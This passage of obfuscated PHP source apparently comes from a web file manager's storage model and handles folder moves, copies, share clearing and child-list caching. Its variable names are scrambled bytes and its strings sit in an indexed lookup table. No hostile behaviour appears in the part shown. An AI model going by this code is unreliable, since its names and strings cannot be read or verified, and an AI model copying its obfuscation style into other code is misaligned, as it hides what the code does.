$this->addAll($ˆÖÄŒÄ, array(), !1); $²³¤¿å = $this->where(array($ÈÍ™ùÚÉ[189] => $Ã…€µ§))->select(); $À˜¥–Å¡ = $this->_childrenMakeRelation($ëÍ•±«Ì, $²³¤¿å); $À˜¥–Å¡[$Ç®æƒóß] = $Ã…€µ§; $á ñæ¥» = array(); $Ï½ªÌÒ· = array(); foreach ($²³¤¿å as $Ìú³Ø‘ä) { $­ïŠé“İ = $Ìú³Ø‘ä[$ÈÍ™ùÚÉ[190]]; $Œ¡î—‡” = $this->_childrenMatch($À˜¥–Å¡, $Ìú³Ø‘ä, $ß¨Ñ”Ä); $á ñæ¥»[] = array($ÈÍ™ùÚÉ[190], $­ïŠé“İ, $ÈÍ™ùÚÉ[189], $Œ¡î—‡”[$ÈÍ™ùÚÉ[189]]); $Ï½ªÌÒ·[] = array($ÈÍ™ùÚÉ[190], $­ïŠé“İ, $ÈÍ™ùÚÉ[561], $Œ¡î—‡”[$ÈÍ™ùÚÉ[561]]); $this->_copyApplyMeta($Ìú³Ø‘ä, $€õº‹Ø®); if ($Ìú³Ø‘ä[$ÈÍ™ùÚÉ[461]] != $ÈÍ™ùÚÉ[98]) { $€õº‹Ø®[$ÈÍ™ùÚÉ[605]][] = $Ìú³Ø‘ä[$ÈÍ™ùÚÉ[517]]; } } $this->chunkEventSet($ÈÍ™ùÚÉ[617], array($ÈÍ™ùÚÉ[618], $†ó†›–ï, $ï³‚ÙÅ¨)); $this->saveAll($á ñæ¥»); $this->chunkEventSet($ÈÍ™ùÚÉ[619], array($ÈÍ™ùÚÉ[620], $†ó†›–ï, $ï³‚ÙÅ¨)); $this->saveAll($Ï½ªÌÒ·); return $Ã…€µ§; } private function _childrenMakeRelation($ÊÉù·›“, $È¸îßÃÔ) { $ÚãË­–ß =& $_SERVER[ˆûùúÊ¯]; $Ò­Ã»ÑÁ = array(); $‘¨­Â÷ = array(); foreach ($ÊÉù·›“ as $íÔú¤ô) { $ò©÷ÕÎè = $íÔú¤ô[$ÚãË­–ß[42]] . $ÚãË­–ß[8] . $íÔú¤ô[$ÚãË­–ß[561]]; $Ò­Ã»ÑÁ[$ò©÷ÕÎè] = $íÔú¤ô[$ÚãË­–ß[190]]; } foreach ($È¸îßÃÔ as $íÔú¤ô) { $ò©÷ÕÎè = $íÔú¤ô[$ÚãË­–ß[42]] . $ÚãË­–ß[8] . $íÔú¤ô[$ÚãË­–ß[561]]; $š†¦İÖÄ = $Ò­Ã»ÑÁ[$ò©÷ÕÎè]; $‘¨­Â÷[$š†¦İÖÄ] = $íÔú¤ô[$ÚãË­–ß[190]]; } return $‘¨­Â÷; } private function _childrenMatch($ïı¶æî, $èı¿Àî‘, $ŸÓº®ñ) { $€äŠÏù =& $_SERVER[ˆûùúÊ¯]; $î´ÚÉŒË = $ŸÓº®ñ[$€äŠÏù[561]]; $æØ’ÙŸ = $this->parentLevelArray($èı¿Àî‘[$€äŠÏù[561]]); foreach ($æØ’ÙŸ as $Â˜•ÛèÆ) { if (isset($ïı¶æî[$Â˜•ÛèÆ])) { $î´ÚÉŒË .= $ïı¶æî[$Â˜•ÛèÆ] . $€äŠÏù[621]; } } $î´ÚÉŒË = rtrim($î´ÚÉŒË, $€äŠÏù[60]) . $€äŠÏù[60]; $©×úªØœ = $this->parentLevelArray($î´ÚÉŒË); $ŞÄÚş¤¶ = $©×úªØœ[count($©×úªØœ) - 1]; return array($€äŠÏù[189] => $ŞÄÚş¤¶, $€äŠÏù[561] => $î´ÚÉŒË); } private function _makeItemData($ÁòşÍ”, $™ÒÇ‡±Ğ, $Šú»‡‹›) { $ûØ®¯ø =& $_SERVER[ˆûùúÊ¯]; $Ó÷¹›¢Î = array($ûØ®¯ø[622] => $ÁòşÍ”[$ûØ®¯ø[461]], $ûØ®¯ø[470] => $Šú»‡‹›, $ûØ®¯ø[623] => $ÁòşÍ”[$ûØ®¯ø[462]] ? $ÁòşÍ”[$ûØ®¯ø[462]] : $ûØ®¯ø[12], $ûØ®¯ø[518] => $ÁòşÍ”[$ûØ®¯ø[517]] ? $ÁòşÍ”[$ûØ®¯ø[517]] : 0, $ûØ®¯ø[593] => $ÁòşÍ”[$ûØ®¯ø[86]] ? $ÁòşÍ”[$ûØ®¯ø[86]] : 0, $ûØ®¯ø[624] => intval($™ÒÇ‡±Ğ[$ûØ®¯ø[187]]), $ûØ®¯ø[625] => intval($™ÒÇ‡±Ğ[$ûØ®¯ø[546]]), $ûØ®¯ø[626] => intval(USER_ID), $ûØ®¯ø[627] => intval(USER_ID), $ûØ®¯ø[453] => intval($™ÒÇ‡±Ğ[$ûØ®¯ø[190]]), $ûØ®¯ø[628] => $™ÒÇ‡±Ğ[$ûØ®¯ø[561]] . $™ÒÇ‡±Ğ[$ûØ®¯ø[190]] . $ûØ®¯ø[60], $ûØ®¯ø[474] => $ÁòşÍ”[$ûØ®¯ø[95]] ? $ÁòşÍ”[$ûØ®¯ø[95]] : time(), $ûØ®¯ø[480] => 0, $ûØ®¯ø[629] => $ûØ®¯ø[12]); return $Ó÷¹›¢Î; } private function _copyApplyMeta($À¯ù©œ’, &$öú¨ùù) { $„åÖÅª‡ =& $_SERVER[ˆûùúÊ¯]; $®“ç‘© = $À¯ù©œ’[$„åÖÅª‡[190]]; $Ü„‰Ìß  = $À¯ù©œ’[$„åÖÅª‡[42]]; if (!isset($À¯ù©œ’[$„åÖÅª‡[630]]) || !$À¯ù©œ’[$„åÖÅª‡[630]] || $À¯ù©œ’[$„åÖÅª‡[630]] == $„åÖÅª‡[221]) { $öú¨ùù[$„åÖÅª‡[607]][] = array($„åÖÅª‡[190], $®“ç‘©, $„åÖÅª‡[630], short_id($®“ç‘©)); } if (Input::check($Ü„‰Ìß , $„åÖÅª‡[631])) { $öú¨ùù[$„åÖÅª‡[606]][] = array($„åÖÅª‡[190] => $®“ç‘©, $„åÖÅª‡[104] => $„åÖÅª‡[514], $„åÖÅª‡[426] => str_replace($„åÖÅª‡[63], $„åÖÅª‡[12], Pinyin::get($Ü„‰Ìß ))); $öú¨ùù[$„åÖÅª‡[606]][] = array($„åÖÅª‡[190] => $®“ç‘©, $„åÖÅª‡[104] => $„åÖÅª‡[513], $„åÖÅª‡[426] => Pinyin::get($Ü„‰Ìß , $„åÖÅª‡[632])); } $öú¨ùù[$„åÖÅª‡[606]][] = array($„åÖÅª‡[190] => $®“ç‘©, $„åÖÅª‡[104] => $„åÖÅª‡[493], $„åÖÅª‡[426] => KodSort::makeStr($Ü„‰Ìß )); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($ğ…á¶€) { $÷ÙĞûşò =& $_SERVER[ˆûùúÊ¯]; $š€İö«í = $this->sourceInfo($ğ…á¶€); $ĞŸ¶‘ = $÷ÙĞûşò[633]; $¡ ãßáº = array($÷ÙĞûşò[561] => array($÷ÙĞûşò[588], $š€İö«í[$÷ÙĞûşò[561]] . $ğ…á¶€ . $÷ÙĞûşò[589]), $÷ÙĞûşò[481] => $this->targetIsDelete); $²ÜóÉâ… = $this->field($ĞŸ¶‘)->where($¡ ãßáº)->select(); if (!$²ÜóÉâ…) { return; } $²ÜóÉâ… = array_to_keyvalue($²ÜóÉâ…, $÷ÙĞûşò[190]); foreach ($²ÜóÉâ… as $Õ‚¹û¯Â) { $•œÊÄÖ = $Õ‚¹û¯Â[$÷ÙĞûşò[189]]; $ğ…á¶€ = $Õ‚¹û¯Â[$÷ÙĞûşò[190]]; if (!isset($this->_childrenListCache[$ğ…á¶€]) && $Õ‚¹û¯Â[$÷ÙĞûşò[461]] == $÷ÙĞûşò[98]) { $this->_childrenListCache[$ğ…á¶€] = array(); } if (!isset($this->_childrenListCache[$•œÊÄÖ])) { $this->_childrenListCache[$•œÊÄÖ] = array(); } $this->_childrenListCache[$•œÊÄÖ][$ğ…á¶€] = $Õ‚¹û¯Â; $this->_childrenItemCache[$ğ…á¶€] = $Õ‚¹û¯Â; } } private function _childrenListAll($ş¦ÇõÔ×, &$õ¯££‰î) { $”ˆìåàÆ =& $_SERVER[ˆûùúÊ¯]; if (!isset($this->_childrenListCache[$ş¦ÇõÔ×])) { return; } $ûëÓì¹† = $this->_childrenListCache[$ş¦ÇõÔ×]; foreach ($ûëÓì¹† as $ÅÅŞÔ™¥ => $ÀùÛõ…¬) { $õ¯££‰î[$ÅÅŞÔ™¥] = $ÀùÛõ…¬; if ($ÀùÛõ…¬[$”ˆìåàÆ[461]] == $”ˆìåàÆ[98]) { $this->_childrenListAll($ÅÅŞÔ™¥, $õ¯££‰î); } } } private function sourceInfoCache($¶ğÊñªá) { if (isset($this->_childrenItemCache[$¶ğÊñªá])) { return $this->_childrenItemCache[$¶ğÊñªá]; } return $this->sourceInfo($¶ğÊñªá); } private function _childrenList($¹‡¢Ä½­) { if (isset($this->_childrenListCache[$¹‡¢Ä½­])) { return $this->_childrenListCache[$¹‡¢Ä½­]; } return $this->_childrenListSelect($¹‡¢Ä½­); } private function _childrenListSelect($Şø¨÷°À) { $ûõƒŸÕ÷ =& $_SERVER[ˆûùúÊ¯]; $¼’¨ø¸ = array($ûõƒŸÕ÷[189] => $Şø¨÷°À, $ûõƒŸÕ÷[481] => $this->targetIsDelete); $ëàñ¶ = $this->where($¼’¨ø¸)->select(); $ëàñ¶ = $ëàñ¶ ? $ëàñ¶ : array(); $„Ê›Æ¥ = array_to_keyvalue($ëàñ¶, $ûõƒŸÕ÷[190]); $this->_childrenListCache[$Şø¨÷°À] = $„Ê›Æ¥; foreach ($„Ê›Æ¥ as $Şø¨÷°À => $³™ã–•) { $this->_childrenItemCache[$Şø¨÷°À] = $³™ã–•; } return $„Ê›Æ¥; } private function fileNameExistCache($Äé‘œƒ, $‚ÜÏÀÛ¢) { $Ê¹Ú¯¿ç =& $_SERVER[ˆûùúÊ¯]; $‚ÜÏÀÛ¢ = strtolower($‚ÜÏÀÛ¢); $‹™´ØÉĞ = $this->_childrenList($Äé‘œƒ); foreach ($‹™´ØÉĞ as $±µåÔî ) { if ($‚ÜÏÀÛ¢ == strtolower($±µåÔî [$Ê¹Ú¯¿ç[42]])) { return $±µåÔî [$Ê¹Ú¯¿ç[190]]; } } return !1; } private function fileNameAutoCache($™š©åËå, $€Ã´ÑÏ, $ºùÒ•µÔ, $ûÇ„ò„–) { $£åì¸±¥ =& $_SERVER[ˆûùúÊ¯]; $›ˆÄÄ§ = $this->_childrenList($™š©åËå); $Õ—ØØãÓ = array_to_keyvalue($›ˆÄÄ§, $£åì¸±¥[12], $£åì¸±¥[42]); return $this->fileNameAutoGet($Õ—ØØãÓ, $€Ã´ÑÏ, $ºùÒ•µÔ, $ûÇ„ò„–); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($ú…ã€İı, $Óªá™ç, $«îÕï½… = REPEAT_REPLACE, $§Ü›½Î± = '') { $ËĞ‡ë”ª =& $_SERVER[ˆûùúÊ¯]; $Ò”˜õîò = $this->sourceInfo($ú…ã€İı); $¬óü¹ë£ = $this->sourceInfo($Óªá™ç); if ($Ò”˜õîò[$ËĞ‡ë”ª[189]] == $¬óü¹ë£[$ËĞ‡ë”ª[190]]) { if ($Ò”˜õîò[$ËĞ‡ë”ª[481]] == $ËĞ‡ë”ª[98]) { Model($ËĞ‡ë”ª[479])->restore(array($ú…ã€İı)); } if (!$§Ü›½Î± || $§Ü›½Î± == $Ò”˜õîò[$ËĞ‡ë”ª[42]]) { return $ú…ã€İı; } } $İ–¶°‚ = $this->pathInfoMore($ú…ã€İı); if ($this->isParentOf($ú…ã€İı, $Óªá™ç)) { return !1; } if (!$Ò”˜õîò || !$¬óü¹ë£ || $¬óü¹ë£[$ËĞ‡ë”ª[461]] != $ËĞ‡ë”ª[98]) { return !1; } Hook::trigger($ËĞ‡ë”ª[634], $İ–¶°‚); $this->targetIsDelete = intval($Ò”˜õîò[$ËĞ‡ë”ª[481]]); if ($Ò”˜õîò[$ËĞ‡ë”ª[189]] == $Óªá™ç && $§Ü›½Î± != $Ò”˜õîò[$ËĞ‡ë”ª[42]]) { $¸ÉŒ×ûŞ = $this->fileNameExist($Óªá™ç, $§Ü›½Î±); if ($¸ÉŒ×ûŞ && $Ò”˜õîò[$ËĞ‡ë”ª[461]] == $ËĞ‡ë”ª[221]) { $ğæíöş = $this->sourceInfo($¸ÉŒ×ûŞ); $å‘øé†× = $this->fileHistory($ğæíöş, $Ò”˜õîò[$ËĞ‡ë”ª[517]], $Ò”˜õîò[$ËĞ‡ë”ª[86]]); if (!$å‘øé†×) { Model($ËĞ‡ë”ª[520])->remove($Ò”˜õîò[$ËĞ‡ë”ª[517]]); } $this->removeNow($ú…ã€İı, !1); $this->folderSizeReset($Óªá™ç); Hook::trigger($ËĞ‡ë”ª[635], $İ–¶°‚); return $¸ÉŒ×ûŞ; } } $Ñ½Ú¯¨‹ = $§Ü›½Î± ? $§Ü›½Î± : $Ò”˜õîò[$ËĞ‡ë”ª[42]]; $this->lockMoveStart($ú…ã€İı); $this->lockWriteStart($Óªá™ç, $Ñ½Ú¯¨‹); $£¯òÍ—Û = array($ËĞ‡ë”ª[605] => array(), $ËĞ‡ë”ª[636] => !1); $this->clearShare($ú…ã€İı, $Óªá™ç); $¿‘×à¯Û = $this->fileNameExistCache($Óªá™ç, $Ò”˜õîò[$ËĞ‡ë”ª[42]]); $ó¨üºò = $this->_move($ú…ã€İı, $Óªá™ç, $«îÕï½…, $£¯òÍ—Û, $§Ü›½Î±); $this->sourceCacheClear(); if ($Ò”˜õîò[$ËĞ‡ë”ª[461]] == $ËĞ‡ë”ª[98] && $¿‘×à¯Û) { $this->folderSizeResetChildren($ó¨üºò); } Model($ËĞ‡ë”ª[223])->linkAdd($£¯òÍ—Û[$ËĞ‡ë”ª[605]]); if ($¿‘×à¯Û && $£¯òÍ—Û[$ËĞ‡ë”ª[636]]) { $this->removeNow($ú…ã€İı, !1); } $this->lockMoveEnd($ú…ã€İı); $this->lockWriteEnd($Óªá™ç, $Ñ½Ú¯¨‹); $this->folderSizeReset($Ò”˜õîò[$ËĞ‡ë”ª[189]]); $this->folderSizeReset($Óªá™ç); $…À½Š‰“ = array($Ò”˜õîò[$ËĞ‡ë”ª[189]], $Óªá™ç); if ($Ò”˜õîò[$ËĞ‡ë”ª[461]] == $ËĞ‡ë”ª[98]) { $…À½Š‰“[] = $ú…ã€İı; } $this->updateModifyTime($…À½Š‰“); Model($ËĞ‡ë”ª[609])->eventMove($ú…ã€İı, $Ò”˜õîò[$ËĞ‡ë”ª[189]], $Óªá™ç); Hook::trigger($ËĞ‡ë”ª[635], $İ–¶°‚); return $ó¨üºò; } private function _move($ÂŠ¾ëª, $”‚ô×Ó, $Ë§Ö—¶, &$Ñ¹ö‡˜, $Ë÷œŒÈå = '') { $…şæ¡¬³ =& $_SERVER[ˆûùúÊ¯]; $½şÂöà£ = $this->sourceInfo($ÂŠ¾ëª); $¹ú†å¶± = $½şÂöà£[$…şæ¡¬³[461]] == $…şæ¡¬³[98]; $‚¼ÎìÜŸ = $Ë÷œŒÈå ? $Ë÷œŒÈå : $½şÂöà£[$…şæ¡¬³[42]]; $éÆêÙÀŠ = $this->fileNameExistCache($”‚ô×Ó, $‚¼ÎìÜŸ); $this->lockMoveStart($ÂŠ¾ëª); $this->lockWriteStart($”‚ô×Ó, $‚¼ÎìÜŸ); if (!$éÆêÙÀŠ) { return $this->_moveForce($ÂŠ¾ëª, $”‚ô×Ó, $‚¼ÎìÜŸ); } $Ô©ÃûÛ = $éÆêÙÀŠ; $¾ûæ’É³ = !1; if ($¹ú†å¶±) { if ($Ë§Ö—¶ == REPEAT_RENAME_FOLDER) { $‚¼ÎìÜŸ = $this->fileNameAuto($”‚ô×Ó, $‚¼ÎìÜŸ, $Ë§Ö—¶, $¹ú†å¶±); $Ô©ÃûÛ = $this->_moveForce($ÂŠ¾ëª, $”‚ô×Ó, $‚¼ÎìÜŸ); } else { if ($Ë§Ö—¶ == REPEAT_RENAME_FOLDER) { $Ë§Ö—¶ = REPEAT_RENAME; } $’ó™½¢¶ = $this->_childrenListSelect($ÂŠ¾ëª); foreach ($’ó™½¢¶ as $ú‰ê¶·) { $this->_move($ú‰ê¶·[$…şæ¡¬³[190]], $éÆêÙÀŠ, $Ë§Ö—¶, $Ñ¹ö‡˜); } $¾ûæ’É³ = !0; } } else { if ($Ë§Ö—¶ == REPEAT_SKIP) { $¾ûæ’É³ = !0; } else { if ($Ë§Ö—¶ == REPEAT_RENAME || $Ë§Ö—¶ == REPEAT_RENAME_FOLDER) { $‚¼ÎìÜŸ = $this->fileNameAuto($”‚ô×Ó, $‚¼ÎìÜŸ, $Ë§Ö—¶, $¹ú†å¶±); $Ô©ÃûÛ = $this->_moveForce($ÂŠ¾ëª, $”‚ô×Ó, $‚¼ÎìÜŸ); } else { if ($Ë§Ö—¶ == REPEAT_REPLACE) { $üÅş­ = $this->sourceInfoCache($éÆêÙÀŠ); $Ú“Ï¤ñé = $this->fileHistory($üÅş­, $½şÂöà£[$…şæ¡¬³[517]], $½şÂöà£[$…şæ¡¬³[86]]); $¾ûæ’É³ = !0; if ($Ú“Ï¤ñé) { $Ñ¹ö‡˜[$…şæ¡¬³[605]][] = $½şÂöà£[$…şæ¡¬³[517]]; } } } } } if ($¾ûæ’É³ && !$Ñ¹ö‡˜[$…şæ¡¬³[636]]) { $Ñ¹ö‡˜[$…şæ¡¬³[636]] = !0; } return $Ô©ÃûÛ; } private function _moveForce($ş©©æ¬˜, $ç¨†í Ğ, $¥ò°ö¬å) { $ÍÁ‚ª =& $_SERVER[ˆûùúÊ¯]; $—‹Ø–Ï = $this->sourceInfo($ş©©æ¬˜); $¥Œ¿ÃÅ¾ = $this->sourceInfo($ç¨†í Ğ); $î®£úÛà = $—‹Ø–Ï[$ÍÁ‚ª[461]] == $ÍÁ‚ª[98]; $°ÁÓ ºã = array($ÍÁ‚ª[453] => $¥Œ¿ÃÅ¾[$ÍÁ‚ª[190]], $ÍÁ‚ª[628] => $¥Œ¿ÃÅ¾[$ÍÁ‚ª[561]] . $¥Œ¿ÃÅ¾[$ÍÁ‚ª[190]] . $ÍÁ‚ª[60], $ÍÁ‚ª[624] => $¥Œ¿ÃÅ¾[$ÍÁ‚ª[187]], $ÍÁ‚ª[625] => $¥Œ¿ÃÅ¾[$ÍÁ‚ª[546]], $ÍÁ‚ª[627] => USER_ID, $ÍÁ‚ª[470] => $¥ò°ö¬å); $øËÙïªš = $—‹Ø–Ï[$ÍÁ‚ª[187]] == SourceModel::TYPE_GROUP && $¥Œ¿ÃÅ¾[$ÍÁ‚ª[187]] == SourceModel::TYPE_GROUP && $—‹Ø–Ï[$ÍÁ‚ª[546]] == $¥Œ¿ÃÅ¾[$ÍÁ‚ª[546]]; if (!$øËÙïªš && $this->moveClearAuth) { Model($ÍÁ‚ª[543])->authClear($ş©©æ¬˜); } $Õ´½ğ€á = $—‹Ø–Ï[$ÍÁ‚ª[481]] == $ÍÁ‚ª[98] && $¥Œ¿ÃÅ¾[$ÍÁ‚ª[481]] != $ÍÁ‚ª[98]; if ($Õ´½ğ€á) { $°ÁÓ ºã[$ÍÁ‚ª[480]] = 0; } if ($î®£úÛà) { $ÁÍÚ¡Å = array($ÍÁ‚ª[628] => array($ÍÁ‚ª[588], $—‹Ø–Ï[$ÍÁ‚ª[561]] . $—‹Ø–Ï[$ÍÁ‚ª[190]] . $ÍÁ‚ª[589])); $Æë×²æ´ = $—‹Ø–Ï[$ÍÁ‚ª[561]] . $—‹Ø–Ï[$ÍÁ‚ª[190]] . $ÍÁ‚ª[60]; $óŸá×í¼ = $¥Œ¿ÃÅ¾[$ÍÁ‚ª[561]] . $¥Œ¿ÃÅ¾[$ÍÁ‚ª[190]] . $ÍÁ‚ª[60] . $—‹Ø–Ï[$ÍÁ‚ª[190]] . $ÍÁ‚ª[60]; $’Œ¡ó˜· = array($ÍÁ‚ª[628] => array($ÍÁ‚ª[637], "\x72\145\x70\154\x61\x63\x65\x28\x70\141\x72\x65\x6e\164\x4c\145\166\x65\x6c\54\47{$Æë×²æ´}\x27\54\47{$óŸá×í¼}\47\51"), $ÍÁ‚ª[624] => $¥Œ¿ÃÅ¾[$ÍÁ‚ª[187]], $ÍÁ‚ª[625] => $¥Œ¿ÃÅ¾[$ÍÁ‚ª[546]]); if ($Õ´½ğ€á) { $’Œ¡ó˜·[$ÍÁ‚ª[480]] = 0; } $this->where($ÁÍÚ¡Å)->data($’Œ¡ó˜·)->save(); } $this->where(array($ÍÁ‚ª[467] => $ş©©æ¬˜))->data($°ÁÓ ºã)->save(); return $ş©©æ¬˜; } private function clearShare($äÃÆÏª, $¼âóÙÂÁ) { $ıÂèä¤Š =& $_SERVER[ˆûùúÊ¯]; $­ÈÍÊç´ = $this->sourceInfo($äÃÆÏª); $» »ñ‡ = $this->sourceInfo($¼âóÙÂÁ); if ($­ÈÍÊç´[$ıÂèä¤Š[546]] == $» »ñ‡[$ıÂèä¤Š[546]] && $­ÈÍÊç´[$ıÂèä¤Š[187]] == $ıÂèä¤Š[638]) { return; } $ğğ¿ŸÁ– = array($ıÂèä¤Š[561] => array($ıÂèä¤Š[588], $­ÈÍÊç´[$ıÂèä¤Š[561]] . $äÃÆÏª . $ıÂèä¤Š[589])); $®¡ÄÑ‚ = $this->field($ıÂèä¤Š[467])->where($ğğ¿ŸÁ–)->getField($ıÂèä¤Š[190], !0); if (!$®¡ÄÑ‚) { return; } $ğğ¿ŸÁ– = array($ıÂèä¤Š[190] => array($ıÂèä¤Š[7], $®¡ÄÑ‚), $ıÂèä¤Š[639] => 1); $›¸Î‹ÙÇ = Model($ıÂèä¤Š[640])->field($ıÂèä¤Š[641])->where($ğğ¿ŸÁ–)->select(); if (!$›¸Î‹ÙÇ) { return; } $›¸Î‹ÙÇ = array_to_keyvalue($›¸Î‹ÙÇ, $ıÂèä¤Š[12], $ıÂèä¤Š[641]); $ğğ¿ŸÁ– = array($ıÂèä¤Š[641] => array($ıÂèä¤Š[7], $›¸Î‹ÙÇ)); Model($ıÂèä¤Š[640])->where($ğğ¿ŸÁ–)->save(array($ıÂèä¤Š[639] => 0)); Model($ıÂèä¤Š[642])->where($ğğ¿ŸÁ–)->delete(); } public function copyFolderFromIO($Ğóü‰Ø§, $Œ—õ‰«, $¬º¢€ÇÎ, $¢éÏîÜ, $Ÿß¥Åş€, $ÇŒÂ­Éë = false) { $óŠ¿ïÈ× =& $_SERVER[ˆûùúÊ¯]; $…ƒÇ÷û“ = array($óŠ¿ïÈ×[606] => array(), $óŠ¿ïÈ×[607] => array(), $óŠ¿ïÈ×[605] => array(), $óŠ¿ïÈ×[643] => array()); $¼õŒáï» = $ÇŒÂ­Éë ? $ÇŒÂ­Éë : $Ğóü‰Ø§->pathThis($Œ—õ‰«); $ıûı»½ = $this->fileNameExist($¬º¢€ÇÎ, $¼õŒáï»); $ı¨ğîÂ› = $this->mkdir($¬º¢€ÇÎ, $¼õŒáï», $¢éÏîÜ); if (!$ıûı»½ || $¢éÏîÜ == REPEAT_RENAME_FOLDER) { $¢éÏîÜ = !1; } if ($ıûı»½) { $this->_childrenAllMake($ıûı»½); } Hook::trigger($óŠ¿ïÈ×[644]); $this->_copyChildTo($Ğóü‰Ø§, $Œ—õ‰«, $ı¨ğîÂ›, $¢éÏîÜ, $…ƒÇ÷û“, $Ÿß¥Åş€); Hook::trigger($óŠ¿ïÈ×[645]); if ($ı¨ğîÂ›) { $this->folderSizeResetChildren($ı¨ğîÂ›); } $this->_childrenListClear(); Model($óŠ¿ïÈ×[608])->addAll($…ƒÇ÷û“[$óŠ¿ïÈ×[606]], array(), !0); Model($óŠ¿ïÈ×[609])->eventCopy($ı¨ğîÂ›); $this->saveAll($…ƒÇ÷û“[$óŠ¿ïÈ×[607]]); Model($óŠ¿ïÈ×[520])->linkAdd($…ƒÇ÷û“[$óŠ¿ïÈ×[605]]); Model($óŠ¿ïÈ×[520])->remove($…ƒÇ÷û“[$óŠ¿ïÈ×[643]]); $this->folderSizeReset($¬º¢€ÇÎ); $this->updateModifyTime($¬º¢€ÇÎ); return $ı¨ğîÂ›; } private function _copyChildTo($úú ¸ğ, $ô¡Äâóã, $‚Õøú“Ÿ, $ü¹œ…¸, &$ëŒœÊ±¸, $¥ŸóåŸ“) { $»æ³Ëû =& $_SERVER[ˆûùúÊ¯]; $Æúİ – = $this->sourceInfoCache($‚Õøú“Ÿ); $’Û‡İœ˜ = $úú ¸ğ->listPath($ô¡Äâóã); $’Û‡İœ˜ = $’Û‡İœ˜ ? $’Û‡İœ˜ : array($»æ³Ëû[93] => array(), $»æ³Ëû[92] => array()); $ê‹õĞå¿ = array_merge($’Û‡İœ˜[$»æ³Ëû[93]], $’Û‡İœ˜[$»æ³Ëû[92]]); $Ù¡™î•£ = $this->_addFiles($úú ¸ğ, $’Û‡İœ˜[$»æ³Ëû[93]], $¥ŸóåŸ“); $—ÎÅşìÉ = array(); foreach ($ê‹õĞå¿ as &$’Ù¹ŞÂ‰) { if (isset($Ù¡™î•£[$’Ù¹ŞÂ‰[$»æ³Ëû[42]]])) { $’Ù¹ŞÂ‰ = $Ù¡™î•£[$’Ù¹ŞÂ‰[$»æ³Ëû[42]]]; } $’Ù¹ŞÂ‰[$»æ³Ëû[461]] = $’Ù¹ŞÂ‰[$»æ³Ëû[43]] == $»æ³Ëû[85]; $’Ù¹ŞÂ‰[$»æ³Ëû[462]] = substr(_get($’Ù¹ŞÂ‰, $»æ³Ëû[184], $»æ³Ëû[12]), 0, 10); $’Ù¹ŞÂ‰[$»æ³Ëû[86]] = _get($’Ù¹ŞÂ‰, $»æ³Ëû[86], 0); $’Ù¹ŞÂ‰[$»æ³Ëû[517]] = _get($’Ù¹ŞÂ‰, $»æ³Ëû[517], 0); if (!isset($’Ù¹ŞÂ‰[$»æ³Ëû[646]]) && $’Ù¹ŞÂ‰[$»æ³Ëû[517]]) { $ëŒœÊ±¸[$»æ³Ëû[643]][] = $’Ù¹ŞÂ‰[$»æ³Ëû[517]]; } if ($ü¹œ…¸) { $ñ÷ü¼ò‹ = $this->fileNameExistCache($‚Õøú“Ÿ, $’Ù¹ŞÂ‰[$»æ³Ëû[42]]); if ($ñ÷ü¼ò‹) { if ($’Ù¹ŞÂ‰[$»æ³Ëû[461]] || $ü¹œ…¸ == REPEAT_SKIP) { continue; } if ($ü¹œ…¸ == REPEAT_REPLACE) { $§ä£ûï = $this->sourceInfoCache($ñ÷ü¼ò‹); $¼¹ …Äá = $this->fileHistory($§ä£ûï, $’Ù¹ŞÂ‰[$»æ³Ëû[517]], $’Ù¹ŞÂ‰[$»æ³Ëû[86]]); if ($¼¹ …Äá) { $ëŒœÊ±¸[$»æ³Ëû[605]][] = $’Ù¹ŞÂ‰[$»æ³Ëû[517]]; } continue; } else { if ($ü¹œ…¸ == REPEAT_RENAME) { $’Ù¹ŞÂ‰[$»æ³Ëû[42]] = $this->fileNameAutoCache($‚Õøú“Ÿ, $’Ù¹ŞÂ‰[$»æ³Ëû[42]], $ü¹œ…¸, !1); } } } } if (!$’Ù¹ŞÂ‰[$»æ³Ëû[461]] && $’Ù¹ŞÂ‰[$»æ³Ëû[517]] == 0) { continue; } if (!$’Ù¹ŞÂ‰[$»æ³Ëû[461]] && $’Ù¹ŞÂ‰[$»æ³Ëû[517]]) { $ëŒœÊ±¸[$»æ³Ëû[605]][] = $’Ù¹ŞÂ‰[$»æ³Ëû[517]]; } $—ÎÅşìÉ[] = $this->_makeItemData($’Ù¹ŞÂ‰, $Æúİ –, $’Ù¹ŞÂ‰[$»æ³Ëû[42]]); } unset($’Ù¹ŞÂ‰); if (!empty($—ÎÅşìÉ)) { $this->addAll($—ÎÅşìÉ); $this->_childrenListSelect($‚Õøú“Ÿ); } $†ñ€Á¿É = $this->_childrenList($‚Õøú“Ÿ); $†ñ€Á¿É = array_to_keyvalue($†ñ€Á¿É, $»æ³Ëû[42]); foreach ($ê‹õĞå¿ as $’Ù¹ŞÂ‰) { $§ä£ûï = $†ñ€Á¿É[$’Ù¹ŞÂ‰[$»æ³Ëû[42]]]; $¦»©Ê¦Ó = $§ä£ûï[$»æ³Ëû[190]]; $this->_copyApplyMeta($§ä£ûï, $ëŒœÊ±¸); if ($’Ù¹ŞÂ‰[$»æ³Ëû[43]] == $»æ³Ëû[85]) { $’Ù¹ŞÂ‰[$»æ³Ëû[94]] = $úú ¸ğ->getPathInner($’Ù¹ŞÂ‰[$»æ³Ëû[94]]); $this->_copyChildTo($úú ¸ğ, $’Ù¹ŞÂ‰[$»æ³Ëû[94]], $¦»©Ê¦Ó, $ü¹œ…¸, $ëŒœÊ±¸, $¥ŸóåŸ“); } } } private function _addFiles($Ñë¦úÄ, $æ™¦Äûò, $ş‹¥Œá”) { $ì°€¤¥Æ =& $_SERVER[ˆûùúÊ¯]; if (!$æ™¦Äûò || count($æ™¦Äûò) == 0) { return array(); } $Ã§¨Ïú½ = array(); foreach ($æ™¦Äûò as &$¬¸æé) { Hook::trigger($ì°€¤¥Æ[647], $¬¸æé); $¬¸æé[$ì°€¤¥Æ[94]] = $Ñë¦úÄ->getPathInner($¬¸æé[$ì°€¤¥Æ[94]]); $Ù„÷ñû» = $Ñë¦úÄ->hashSimple($¬¸æé[$ì°€¤¥Æ[94]]); $Ï¢ñ³×Ì = $Ñë¦úÄ->hashMd5($¬¸æé[$ì°€¤¥Æ[94]]); if (strlen($Ï¢ñ³×Ì) > 10 && !isset($Ã§¨Ïú½[$Ï¢ñ³×Ì])) { $Ã§¨Ïú½[$Ï¢ñ³×Ì] = array(); } $¬¸æé[$ì°€¤¥Æ[648]] = $Ù„÷ñû»; 